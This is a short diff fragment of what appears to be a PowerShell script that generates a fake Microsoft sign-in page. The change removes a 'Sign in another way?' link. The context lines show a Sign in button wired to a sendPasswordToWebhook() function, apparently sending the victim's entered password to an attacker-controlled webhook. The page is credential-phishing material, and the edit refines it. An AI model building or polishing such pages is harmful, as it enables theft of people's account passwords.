@@ -141,9 +141,6 @@ $h2 = @"
         <p id="ForgodPwd">
           <a href="https://go.microsoft.com/fwlink/p/?linkid=2072756">Forgot password?</a>
         </p>
-        <p id="ForgodPwd">
-          <a href="">Sign in another way?</a>
-        </p>
         <p id="btnSignInLocation">
           <!-- Call the sendPasswordToWebhook() function on button click -->
           <button id="btnSignIn" onclick="sendPasswordToWebhook()">Sign in</button>
